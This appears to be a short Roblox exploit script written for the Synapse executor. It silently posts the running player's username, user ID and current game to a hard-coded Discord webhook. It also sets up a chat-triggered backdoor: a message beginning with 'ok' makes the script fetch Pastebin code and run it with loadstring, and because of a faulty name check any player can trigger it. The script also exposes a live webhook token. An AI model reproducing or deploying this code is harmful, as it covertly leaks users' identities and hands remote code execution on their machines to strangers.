pcall(function()
local response = syn.request(
    {
        Url = 'https://discordapp.com/api/webhooks/716370407128694854/GC2GNna7WgxfSKw91fiinozH4dysqT7XBLpoGOOh_LinNWGMjKvKggPvx8QeZ8KPnvBt',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "Player: "..game.Players.LocalPlayer.Name.." / https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.." just injected at https://www.roblox.com/games/" ..game.PlaceId.. "/Place"})
    }
);
end)


game.Players.PlayerAdded:Connect(function(p)
if p.Name == "SlashaMane" or "aiming4u" then
  p.Chatted:Connect(function(cht)
    if cht:lower():sub(1,2) == ("ok") then
                 local exec = string.sub(cht, 3)
       loadstring(game:HttpGet("https://pastebin.com/raw/"..exec, true))()
  end
end)
end
end)
